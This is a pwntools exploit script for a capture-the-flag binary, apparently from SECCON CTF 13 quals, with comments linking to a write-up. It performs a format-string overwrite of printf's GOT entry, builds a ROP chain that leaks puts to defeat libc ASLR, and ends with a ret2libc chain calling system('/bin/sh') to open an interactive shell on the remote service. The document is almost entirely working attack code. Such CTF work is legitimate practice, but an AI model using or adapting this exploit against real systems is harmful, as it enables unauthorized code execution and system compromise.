from pwn import *

#r = process("./challx")
r = remote("localhost", 5000)
elf = ELF("./challx")
libc = ELF("libc.so.6")
'''
	you can take the libc out from docker
	https://github.com/redpwn/jail/blob/7e604f10d8e48c485b381cbed688ed8c2cd902e8/docs/competitors.md

	write up for this challenge :
	https://medium.com/@netorika/seccon-ctf-13-quals-paragraph-pwnable-writeup-606877568169
'''
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"
# context.log_level = "debug"

# gdb.attach(r, gdbscript='''
# #b main
# b *0x00000000004011E1
# b *0x4011B7
# ''')

payload = b""
payload += b"%4198496"+ b"c%8$llnA" + pack(elf.symbols.got.printf)[:-1]
r.sendlineafter(b"What is your name", payload)

payload2 = b" uhm, You've got a nice name. \" "
payload2 += b"a"*40
payload2 += p64(0x40124b) #pop rdi
payload2 += p64(0x404018) #puts@got
payload2 += p64(0x401030) #puts
payload2 += p64(0x401152) #main

r.sendlineafter(b"A(@@", payload2)
r.sendline(b"x\n")
r.recvuntil(b"bye\x2e\x2e\x2e\x0a")


leak_puts = r.read(6)+b"\x00\x00"
puts_libc = libc.symbols.puts
leak_libc = u64(leak_puts)-puts_libc
info(hex(leak_libc))

libc.address = leak_libc

r.sendline(b"x")
# r.sendline(b"o")

payload3 = b" uhm, You've got a nice name. \" "
payload3 += b"a"*40
payload3 += p64(0x4011E1) #ret
payload3 += p64(0x40124b) #pop rdi
payload3 += p64(next(libc.search(b"/bin/sh")))
payload3 += p64(libc.symbols.system)

r.sendlineafter(b"\x0a", payload3)

r.sendline(b"o")

r.recvuntil(b"Good bye...")

r.interactive()